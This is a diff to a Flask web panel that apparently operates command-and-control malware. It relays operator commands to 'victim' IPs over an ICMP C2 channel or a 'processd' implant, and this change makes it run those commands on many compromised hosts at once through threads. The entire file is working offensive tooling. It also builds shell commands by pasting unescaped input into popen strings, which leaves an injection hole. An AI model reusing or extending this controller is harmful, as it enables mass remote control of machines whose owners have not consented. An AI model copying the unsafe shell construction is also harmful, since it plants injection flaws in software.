@@ -1,6 +1,7 @@
 from flask import Flask, render_template, request
 from os import popen, system
 from json import dumps
+import threading
 
 app = Flask("__app__")
 
@@ -11,16 +12,24 @@ dirname = Path(__file__).parent.resolve()
 def index():
     return render_template("index.html")
 
-def icmp_at(vic_ip, command):
+def icmp_at(vic_ip, command, outputs=None):
+    print(f"Trying {vic_ip}")
     with popen(f"echo \"{command}\n\" | python3 {dirname}/../icmp-c2/send_command.py {vic_ip}") as f:
         raw = f.read()
     output = raw.split("\n", 1)[1]
-    return output
-def http_at(vic_ip, command):
+    if outputs is not None:
+        outputs[vic_ip] = output
+    else:
+        return output
+def http_at(vic_ip, command, outputs=None):
+    print(f"Trying {vic_ip}")
     with popen(f"echo \"{vic_ip}\n{command}\n\" | python3 {dirname}/../processd/send_command.py") as f:
         raw = f.read()
     output = raw.split("\n", 1)[1]
-    return output
+    if outputs is not None:
+        outputs[vic_ip] = output
+    else:
+        return output
 
 device_mappings = {
     "ad": 60,
@@ -30,8 +39,23 @@ device_mappings = {
     "windows1": 70,
     "windows2": 80
 }
+
+def run(devices, command):
+    threads = []
+    outputs = {}
+    for device in list(devices):
+        if request.json["use"] == "icmp":
+            thread = threading.Thread(target=icmp_at, args=(device, command, outputs), daemon=True)
+        elif request.json["use"] == "processd":
+            thread = threading.Thread(target=http_at, args=(device, command, outputs), daemon=True)
+        threads.append(thread)
+        thread.start()
+    for thread in threads:
+        thread.join()
+    return dumps(outputs).replace("\\",r"\\")
+
 @app.route("/run", methods=["POST"])
-def run():
+def handle_run():
     if request.json["use"] not in ("icmp", "processd"):
         return "invalid use value"
     # Does nothing with return port
@@ -44,13 +68,14 @@ def run():
                 devices.add(f"10.{i+1}.1.{device_mappings[value]}")
         else:
             devices.add(value)
-    outputs = {}
-    for device in list(devices):
-        if request.json["use"] == "icmp":
-            outputs[device] = icmp_at(device, command)
-        elif request.json["use"] == "processd":
-            outputs[device] = http_at(device, command)
-    return dumps(outputs).replace("\\",r"\\")
+    return run(devices, command)
+    # outputs = {}
+    # for device in list(devices):
+    #     if request.json["use"] == "icmp":
+    #         outputs[device] = icmp_at(device, command)
+    #     elif request.json["use"] == "processd":
+    #         outputs[device] = http_at(device, command)
+    # return dumps(outputs).replace("\\",r"\\")
 
 
 @app.route("/processd", methods=["POST"])
